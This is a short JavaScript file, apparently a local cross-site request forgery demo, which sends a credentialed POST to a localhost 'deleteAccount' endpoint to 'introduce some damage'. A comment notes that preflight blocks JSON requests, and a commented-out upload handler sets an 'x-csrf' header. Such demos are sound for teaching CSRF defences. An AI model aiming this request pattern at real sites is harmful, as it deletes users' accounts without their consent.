;(async () => {
  console.log('Trying to introduce some damage ...')

  const response = await fetch(`http://localhost:3000/deleteAccount`, {
    method: 'POST',
    credentials: 'include',

    // All "application/json" requests, even GET are blocked by preflight request policy
    // headers: {
    //   'Content-Type': 'application/json',
    // },
  })

  console.log('response', response)
  console.log('data', await response.json())
})()

// eslint-disable-next-line
// function onFileChangeHandler(event) {
//   const file = event.target.files[0]

//   const data = new FormData()
//   data.append('file', file)

//   fetch('http://localhost:3000/file', {
//     method: 'POST',
//     credentials: 'include',
//     body: data,
//     headers: {
//       'x-csrf': 1,
//     },
//   })
//     .then((response) => response.json())
//     .then((success) => console.log(success))
//     .catch((error) => console.log(error))
// }
